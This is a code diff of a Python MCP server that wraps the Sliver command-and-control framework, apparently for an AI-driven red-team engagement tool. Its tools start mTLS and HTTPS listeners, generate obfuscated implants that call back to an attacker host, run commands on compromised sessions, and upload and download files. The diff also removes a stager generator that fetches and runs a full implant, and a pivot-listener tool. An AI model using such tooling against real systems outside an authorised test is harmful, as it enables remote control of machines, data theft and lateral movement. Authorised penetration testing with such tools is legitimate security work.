@@ -24,38 +24,20 @@ _SSE_PORT = int(os.environ.get("SLIVER_SSE_PORT", "8023"))
 
 def _find_config() -> Path | None:
     """Locate the Sliver operator config file."""
-    # Check engagement config first
-    engagement_config = _PROJECT_ROOT / "engagement" / "config.yaml"
-    if engagement_config.exists():
-        try:
-            import yaml  # noqa: F811 — optional, fall back to string parsing
-            with open(engagement_config) as f:
-                cfg = yaml.safe_load(f)
-            sliver_cfg = cfg.get("shell", {}).get("sliver_config")
-            if sliver_cfg:
-                p = Path(sliver_cfg)
-                if not p.is_absolute():
-                    p = _PROJECT_ROOT / p
-                if p.exists():
-                    return p
-        except Exception:
-            pass
-
     # Default location
     default = _PROJECT_ROOT / "engagement" / "sliver.cfg"
     if default.exists():
         return default
-
     return None
 
 
 def _not_configured_msg() -> str:
     return (
         "ERROR: Sliver not configured for this engagement.\n"
-        "Run: operator/setup.sh and select Sliver as the shell backend,\n"
+        "Run: operator/config.sh and select Sliver as the shell backend,\n"
         "or manually create engagement/sliver.cfg:\n"
         "  sliver-server operator --name red-run --lhost 127.0.0.1 "
-        "--save engagement/sliver.cfg"
+        "--permissions all --save engagement/sliver.cfg"
     )
 
 
@@ -75,33 +57,34 @@ def create_server() -> FastMCP:
     # Shared async client — connected lazily on first tool call
     _client = None
     _client_lock = asyncio.Lock()
-    _config_path = _find_config()
 
     async def _get_client():
         nonlocal _client
         async with _client_lock:
-            if _client is not None:
+            if _client is not None and _client.is_connected():
                 return _client
-            if _config_path is None:
+            config_path = _find_config()
+            if config_path is None:
                 return None
             try:
                 import sliver
                 config = sliver.SliverClientConfig.parse_config_file(
-                    str(_config_path)
+                    str(config_path)
                 )
-                client = sliver.SliverClientAsync(config)
+                client = sliver.SliverClient(config)
                 await client.connect()
                 _client = client
                 return _client
-            except Exception as e:
+            except Exception:
                 return None
+
+    import functools
 
     def _require_config(fn):
         """Decorator that checks for Sliver config before calling tool."""
-        import functools
         @functools.wraps(fn)
         async def wrapper(*args, **kwargs):
-            if _config_path is None:
+            if _find_config() is None:
                 return _not_configured_msg()
             client = await _get_client()
             if client is None:
@@ -128,10 +111,10 @@ def create_server() -> FastMCP:
             port: Bind port (default 4444).
         """
         try:
-            job = await client.start_mtls_listener(host=host, port=port)
+            listener = await client.start_mtls_listener(host=host, port=port)
             return json.dumps({
                 "status": "listening",
-                "job_id": job.JobID,
+                "job_id": listener.JobID,
                 "host": host,
                 "port": port,
                 "protocol": "mtls",
@@ -155,12 +138,12 @@ def create_server() -> FastMCP:
             domain: Optional domain for TLS certificate.
         """
         try:
-            job = await client.start_https_listener(
+            listener = await client.start_https_listener(
                 host=host, port=port, domain=domain
             )
             return json.dumps({
                 "status": "listening",
-                "job_id": job.JobID,
+                "job_id": listener.JobID,
                 "host": host,
                 "port": port,
                 "protocol": "https",
@@ -206,7 +189,7 @@ def create_server() -> FastMCP:
     @_require_config
     async def generate_implant(
         client,
-        os: str = "linux",
+        target_os: str = "linux",
         arch: str = "amd64",
         mtls_host: str = "",
         mtls_port: int = 4444,
@@ -219,7 +202,7 @@ def create_server() -> FastMCP:
         persistent mTLS connection) — not beacon mode.
 
         Args:
-            os: Target OS — linux, windows, darwin.
+            target_os: Target OS — linux, windows, darwin.
             mtls_host: Callback host (attackbox IP). Required.
             mtls_port: Callback port (must match listener).
             arch: Target architecture — amd64, arm64, 386.
@@ -237,111 +220,55 @@ def create_server() -> FastMCP:
                 Priority=0,
             )]
 
+            format_map = {
+                "exe": client_pb2.EXECUTABLE,
+                "shared": client_pb2.SHARED_LIB,
+                "shellcode": client_pb2.SHELLCODE,
+                "service": client_pb2.SERVICE,
+            }
+
             config = client_pb2.ImplantConfig(
                 IsBeacon=False,
-                GOOS=os,
+                GOOS=target_os,
                 GOARCH=arch,
-                Format=(
-                    client_pb2.EXECUTABLE if format == "exe"
-                    else client_pb2.SHARED_LIB if format == "shared"
-                    else client_pb2.SHELLCODE if format == "shellcode"
-                    else client_pb2.SERVICE if format == "service"
-                    else client_pb2.EXECUTABLE
-                ),
+                Format=format_map.get(format, client_pb2.EXECUTABLE),
                 ObfuscateSymbols=True,
                 C2=c2,
                 Name=name or "",
             )
 
-            implant = await client.generate_implant(config)
+            result = await client.generate_implant(config)
 
             # Save to engagement/evidence/
             evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
             evidence_dir.mkdir(parents=True, exist_ok=True)
 
-            ext = {
-                "linux": "",
-                "windows": ".exe",
-                "darwin": "",
-            }.get(os, "")
+            ext = {"linux": "", "windows": ".exe", "darwin": ""}.get(
+                target_os, ""
+            )
             implant_name = name or f"implant-{int(time.time())}"
             filename = f"{implant_name}{ext}"
             filepath = evidence_dir / filename
 
             with open(filepath, "wb") as f:
-                f.write(implant.File.Data)
+                f.write(result.File.Data)
             filepath.chmod(0o755)
 
-            sha256 = hashlib.sha256(implant.File.Data).hexdigest()
+            sha256 = hashlib.sha256(result.File.Data).hexdigest()
 
             return json.dumps({
                 "status": "generated",
-                "name": implant.File.Name,
+                "name": result.File.Name,
                 "path": str(filepath),
-                "size": len(implant.File.Data),
+                "size": len(result.File.Data),
                 "sha256": sha256,
-                "os": os,
+                "os": target_os,
                 "arch": arch,
                 "format": format,
                 "callback": f"mtls://{mtls_host}:{mtls_port}",
             })
         except Exception as e:
             return f"ERROR: Implant generation failed: {e}"
-
-    @mcp.tool()
-    @_require_config
-    async def generate_stager(
-        client,
-        os: str = "linux",
-        arch: str = "amd64",
-        protocol: str = "tcp",
-        host: str = "",
-        port: int = 8443,
-    ) -> str:
-        """Generate a small first-stage stager payload.
-
-        Stagers are small shellcode payloads (~10KB) that download and
-        execute the full implant. Useful for size-constrained delivery.
-
-        Args:
-            os: Target OS.
-            arch: Target architecture.
-            protocol: Stager protocol — tcp, http, https.
-            host: Stage listener host. Required.
-            port: Stage listener port.
-        """
-        if not host:
-            return "ERROR: host is required (stage listener address)."
-
-        try:
-            from sliver import client_pb2
-
-            stager = await client.generate_msf_stager(
-                arch=arch,
-                format=f"{protocol}",
-                host=host,
-                port=port,
-                os=os,
-            )
-
-            evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
-            evidence_dir.mkdir(parents=True, exist_ok=True)
-
-            filename = f"stager-{int(time.time())}.bin"
-            filepath = evidence_dir / filename
-
-            with open(filepath, "wb") as f:
-                f.write(stager.File.Data)
-
-            return json.dumps({
-                "status": "generated",
-                "path": str(filepath),
-                "size": len(stager.File.Data),
-                "protocol": protocol,
-                "listener": f"{host}:{port}",
-            })
-        except Exception as e:
-            return f"ERROR: Stager generation failed: {e}"
 
     # ── Session management ──────────────────────────────────────────
 
@@ -379,7 +306,7 @@ def create_server() -> FastMCP:
     async def execute(
         client,
         session_id: str = "",
-        command: str = "",
+        exe: str = "",
         args: str = "",
         output: bool = True,
     ) -> str:
@@ -387,17 +314,19 @@ def create_server() -> FastMCP:
 
         Args:
             session_id: Session ID from list_sessions. Required.
-            command: Command to execute. Required.
+            exe: Executable/command to run. Required.
             args: Space-separated arguments.
             output: Capture stdout/stderr (default true).
         """
-        if not session_id or not command:
-            return "ERROR: session_id and command are required."
+        if not session_id or not exe:
+            return "ERROR: session_id and exe are required."
 
         try:
             session = await client.interact_session(session_id)
+            if session is None:
+                return f"ERROR: Session {session_id} not found or dead."
             result = await session.execute(
-                command,
+                exe,
                 args.split() if args else [],
                 output,
             )
@@ -428,7 +357,7 @@ def create_server() -> FastMCP:
             remote_path: Destination path on target. Required.
         """
         if not session_id or not local_path or not remote_path:
-            return "ERROR: session_id, local_path, and remote_path are required."
+            return "ERROR: session_id, local_path, and remote_path required."
 
         local = Path(local_path)
         if not local.exists():
@@ -436,6 +365,8 @@ def create_server() -> FastMCP:
 
         try:
             session = await client.interact_session(session_id)
+            if session is None:
+                return f"ERROR: Session {session_id} not found or dead."
             data = local.read_bytes()
             result = await session.upload(remote_path, data)
             return json.dumps({
@@ -466,6 +397,8 @@ def create_server() -> FastMCP:
 
         try:
             session = await client.interact_session(session_id)
+            if session is None:
+                return f"ERROR: Session {session_id} not found or dead."
             result = await session.download(remote_path)
 
             if not local_path:
@@ -501,16 +434,15 @@ def create_server() -> FastMCP:
 
         try:
             session = await client.interact_session(session_id)
+            if session is None:
+                return f"ERROR: Session {session_id} not found or dead."
             result = await session.ifconfig()
             interfaces = []
             for iface in result.NetInterfaces:
-                addrs = []
-                for addr in iface.IPAddresses:
-                    addrs.append(addr)
                 interfaces.append({
                     "name": iface.Name,
                     "mac": iface.MAC,
-                    "addresses": addrs,
+                    "addresses": list(iface.IPAddresses),
                 })
             return json.dumps({"interfaces": interfaces})
         except Exception as e:
@@ -528,8 +460,7 @@ def create_server() -> FastMCP:
             return "ERROR: session_id is required."
 
         try:
-            session = await client.interact_session(session_id)
-            await session.kill()
+            await client.kill_session(session_id)
             return json.dumps({
                 "status": "killed",
                 "session_id": session_id,
@@ -541,66 +472,26 @@ def create_server() -> FastMCP:
 
     @mcp.tool()
     @_require_config
-    async def start_pivot_listener(
-        client,
-        session_id: str = "",
-        pivot_type: str = "tcp",
-        bind_address: str = "0.0.0.0",
-        bind_port: int = 9898,
-    ) -> str:
-        """Start a pivot listener on a compromised host.
-
-        Other implants connect through this pivot to reach the C2 server.
-        Generate new implants with the pivot host as the callback target.
+    async def list_pivots(client, session_id: str = "") -> str:
+        """List pivot listeners on a session.
 
         Args:
-            session_id: Session on the pivot host. Required.
-            pivot_type: Pivot type — tcp or named-pipe.
-            bind_address: Address to bind on pivot host.
-            bind_port: Port to bind on pivot host.
+            session_id: Session ID to check for pivot listeners. Required.
         """
         if not session_id:
             return "ERROR: session_id is required."
 
         try:
             session = await client.interact_session(session_id)
-            if pivot_type == "tcp":
-                result = await session.start_tcp_pivot(
-                    bind_address=bind_address,
-                    port=bind_port,
-                )
-            else:
-                return f"ERROR: Unsupported pivot type: {pivot_type}. Use tcp."
-
-            return json.dumps({
-                "status": "pivot_listening",
-                "pivot_id": result.ID if hasattr(result, "ID") else "",
-                "session_id": session_id,
-                "type": pivot_type,
-                "bind": f"{bind_address}:{bind_port}",
-                "message": (
-                    f"Pivot listener running on session {session_id}. "
-                    f"Generate implants with callback to "
-                    f"{bind_address}:{bind_port} on the pivot host."
-                ),
-            })
-        except Exception as e:
-            return f"ERROR: Pivot listener failed: {e}"
-
-    @mcp.tool()
-    @_require_config
-    async def list_pivots(client) -> str:
-        """List active pivot listeners across all sessions."""
-        try:
-            pivots = await client.pivots()
+            if session is None:
+                return f"ERROR: Session {session_id} not found or dead."
+            pivots = await session.pivot_listeners()
             result = []
             for p in pivots:
                 result.append({
-                    "pivot_id": p.ID,
-                    "session_id": str(p.OriginID)
-                    if hasattr(p, "OriginID") else "",
-                    "type": p.Type,
-                    "remote_address": p.RemoteAddress,
+                    "id": p.ID,
+                    "type": str(p.Type),
+                    "bind_address": p.BindAddress,
                 })
             return json.dumps({"pivots": result, "count": len(result)})
         except Exception as e:
@@ -614,7 +505,7 @@ def create_server() -> FastMCP:
     @mcp.custom_route("/status", methods=["GET"])
     async def status(request: Request) -> JSONResponse:
         """Health check endpoint for run.sh."""
-        if _config_path is None:
+        if _find_config() is None:
             return JSONResponse({"status": "not_configured", "sessions": 0})
         client = await _get_client()
         if client is None:
